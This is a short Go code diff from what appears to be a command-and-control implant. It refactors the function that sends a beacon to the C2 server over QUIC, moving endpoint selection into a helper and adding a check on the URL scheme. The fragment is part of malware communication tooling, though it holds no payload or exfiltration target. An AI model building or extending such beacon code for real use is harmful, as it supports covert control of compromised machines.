@@ -8,7 +8,6 @@ import (
 	"crypto/tls"
 	"fmt"
 	"io"
-	"strings"
 	"time"
 
 	"github.com/quic-go/quic-go"
@@ -20,13 +19,10 @@ const quicMaxBeacon = 16 * 1024 * 1024
 // The C2 URL is quic://host:port. The write side is closed after the
 // request so the server can ReadAll; the response is read until EOF.
 func sendQUICBeacon(body []byte) []byte {
-	raw := strings.TrimPrefix(C2URL, "quic://")
-	if raw == "" || raw == C2URL {
-		raw = strings.TrimPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "quic://")
-	}
-	if raw == "" {
+	raw, scheme, ok := currentC2Dial()
+	if !ok || (scheme != "" && scheme != "quic") {
 		if Debug {
-			fmt.Printf("[!] QUIC beacon: no quic:// endpoint configured\n")
+			fmt.Printf("[!] QUIC beacon: no quic:// endpoint configured (scheme=%s)\n", scheme)
 		}
 		return nil
 	}
